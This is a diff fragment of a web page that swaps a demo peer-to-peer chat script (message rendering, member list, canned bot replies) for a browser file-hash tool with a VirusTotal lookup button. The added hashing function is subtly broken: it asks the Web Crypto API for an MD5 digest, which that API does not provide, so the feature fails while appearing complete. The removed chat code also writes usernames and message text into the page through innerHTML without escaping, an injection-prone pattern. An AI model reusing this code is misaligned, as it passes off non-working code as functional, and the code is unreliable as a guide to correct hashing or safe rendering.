-        }
-        
-        function sendMessage(text) {
-            const timestamp = new Date().toISOString();
-            
-            // Add message to UI immediately
-            addMessage(userData, text, timestamp, true);
-            
-            // In a real app, you would send to other peers here
-            // For this demo, we'll simulate receiving messages after a delay
-            if (Math.random() > 0.7) {
-                setTimeout(() => {
-                    const botResponse = generateBotResponse(text);
-                    const botUser = {
-                        id: 'bot',
-                        username: 'ChatBot',
-                        avatar: null,
-                        tag: '0000'
+
+            // Calculate file hashes
+            async function calculateFileHash(file) {
+                return new Promise((resolve, reject) => {
+                    const reader = new FileReader();
+                    
+                    reader.onload = function(e) {
+                        const arrayBuffer = e.target.result;
+                        
+                        crypto.subtle.digest('MD5', arrayBuffer)
+                            .then(md5Buffer => {
+                                const md5 = hexString(new Uint8Array(md5Buffer));
+                                
+                                return crypto.subtle.digest('SHA-1', arrayBuffer)
+                                    .then(sha1Buffer => {
+                                        const sha1 = hexString(new Uint8Array(sha1Buffer));
+                                        
+                                        return crypto.subtle.digest('SHA-256', arrayBuffer)
+                                            .then(sha256Buffer => {
+                                                const sha256 = hexString(new Uint8Array(sha256Buffer));
+                                                
+                                                resolve({
+                                                    md5: md5,
+                                                    sha1: sha1,
+                                                    sha256: sha256
+                                                });
+                                            });
+                                    });
+                            })
+                            .catch(reject);
                     };
-                    addMessage(botUser, botResponse, new Date().toISOString(), false);
-                }, 1000 + Math.random() * 2000);
+                    
+                    reader.onerror = reject;
+                    reader.readAsArrayBuffer(file);
+                });
             }
-        }
-        
-        function addMessage(user, text, timestamp, isOwnMessage) {
-            const messageElement = document.createElement('div');
-            messageElement.className = 'message';
-            
-            const avatarContent = user.avatar 
-                ? `<img src="${user.avatar}" alt="${user.username}">`
-                : `<span>${getInitials(user.username)}</span>`;
-            
-            const now = new Date(timestamp);
-            const timeString = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
-            
-            // Process mentions
-            let processedText = text;
-            if (text.includes('@')) {
-                processedText = text.replace(/@(\w+)/g, '<span class="mention">@$1</span>');
+
+            // Convert to hex string
+            function hexString(buffer) {
+                return Array.from(buffer)
+                    .map(b => b.toString(16).padStart(2, '0'))
+                    .join('');
             }
-            
-            messageElement.innerHTML = `
-                <div class="message-avatar" style="background-color: ${stringToColor(user.username)};">
-                    ${avatarContent}
-                </div>
-                <div class="message-content">
-                    <div class="message-header">
-                        <span class="message-author" style="color: ${stringToColor(user.username)};">${user.username}</span>
-                        <span class="message-timestamp">Today at ${timeString}</span>
-                    </div>
-                    <div class="message-text">${processedText}</div>
-                </div>
-            `;
-            
-            messagesContainer.appendChild(messageElement);
-            messagesContainer.scrollTop = messagesContainer.scrollHeight;
-        }
-        
-        function addSystemMessage(text) {
-            const messageElement = document.createElement('div');
-            messageElement.className = 'message';
-            
-            messageElement.innerHTML = `
-                <div class="message-avatar" style="background-color: #5865f2;">
-                    <i class="fas fa-robot"></i>
-                </div>
-                <div class="message-content">
-                    <div class="message-header">
-                        <span class="message-author" style="color: #5865f2;">ChatBot</span>
-                        <span class="message-timestamp">Today at ${new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}</span>
-                    </div>
-                    <div class="message-text">${text}</div>
-                </div>
-            `;
-            
-            messagesContainer.appendChild(messageElement);
-            messagesContainer.scrollTop = messagesContainer.scrollHeight;
-        }
-        
-        function updateMembersList() {
-            membersList.innerHTML = '';
-            
-            // Add yourself
-            const memberElement = document.createElement('div');
-            memberElement.className = 'member-item';
-            
-            const avatarContent = userData.avatar 
-                ? `<img src="${userData.avatar}" alt="${userData.username}">`
-                : `<span>${getInitials(userData.username)}</span>`;
-            
-            memberElement.innerHTML = `
-                <div class="online-indicator"></div>
-                <div class="member-avatar" style="background-color: ${stringToColor(userData.username)};">
-                    ${avatarContent}
-                </div>
-                <div class="member-name">${userData.username} ${userData.isHost ? '(Host)' : ''}</div>
-            `;
-            
-            membersList.appendChild(memberElement);
-            
-            // Update online count
-            onlineCount.textContent = '1';
-        }
-        
-        function stringToColor(str) {
-            let hash = 0;
-            for (let i = 0; i < str.length; i++) {
-                hash = str.charCodeAt(i) + ((hash << 5) - hash);
-            }
-            
-            const colors = [
-                '#5865f2', '#57f287', '#fee75c', '#eb459e', '#ed4245', 
-                '#faa61a', '#a155d9', '#3ba55c', '#f57731', '#4d5fab'
-            ];
-            
-            return colors[Math.abs(hash) % colors.length];
-        }
-        
-        function generateId() {
-            return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
-        }
-        
-        function generateRoomCode() {
-            return Math.random().toString(36).substring(2, 8).toUpperCase();
-        }
-        
-        function copyInviteLink() {
-            inviteLink.select();
-            document.execCommand('copy');
-            copyBtn.textContent = 'Copied!';
-            setTimeout(() => {
-                copyBtn.textContent = 'Copy';
-            }, 2000);
-        }
-        
-        function generateBotResponse(message) {
-            const responses = [
-                "That's interesting!",
-                "I see what you mean.",
-                "Tell me more about that.",
-                "How does that make you feel?",
-                "I'm here to chat with you!",
-                "That's a good point.",
-                "I understand what you're saying.",
-                "Let's keep the conversation going!",
-                "Thanks for sharing that.",
-                "I'm learning from our conversation."
-            ];
-            
-            const questions = [
-                "What do you think about this chat?",
-                "How's your day going?",
-                "Have you tried any new games lately?",
-                "What's your favorite programming language?",
-                "Do you have any projects you're working on?"
-            ];
-            
-            if (message.includes('?')) {
-                return questions[Math.floor(Math.random() * questions.length)];
-            }
-            
-            return responses[Math.floor(Math.random() * responses.length)];
-        }
-        
-        // Initialize with a random username
-        const randomNames = ['CyberHacker', 'CodeMaster', 'DigitalGhost', 'ByteWizard', 'DataDrifter'];
-        const randomName = randomNames[Math.floor(Math.random() * randomNames.length)];
-        usernameInput.value = randomName;
-        updateAvatarPreview();
-        
-        // Check URL for room code on load
-        window.addEventListener('load', checkUrlForRoom);
+
+            // Scan with VirusTotal
+            scanBtn.addEventListener('click', function() {
+                const hash = sha256Hash.textContent;
+                if (hash && hash !== '-') {
+                    window.open(`https://www.virustotal.com/gui/file/${hash}`, '_blank');
+                } else {
+                    alert('Please upload a file first to generate a hash.');
+                }
+            });
+
+            // Reset button
+            resetBtn.addEventListener('click', function() {
+                fileInput.value = '';
+                fileInfo.style.display = 'none';
+                loading.style.display = 'none';
+            });
+        });
     </script>
 </body>
 </html>
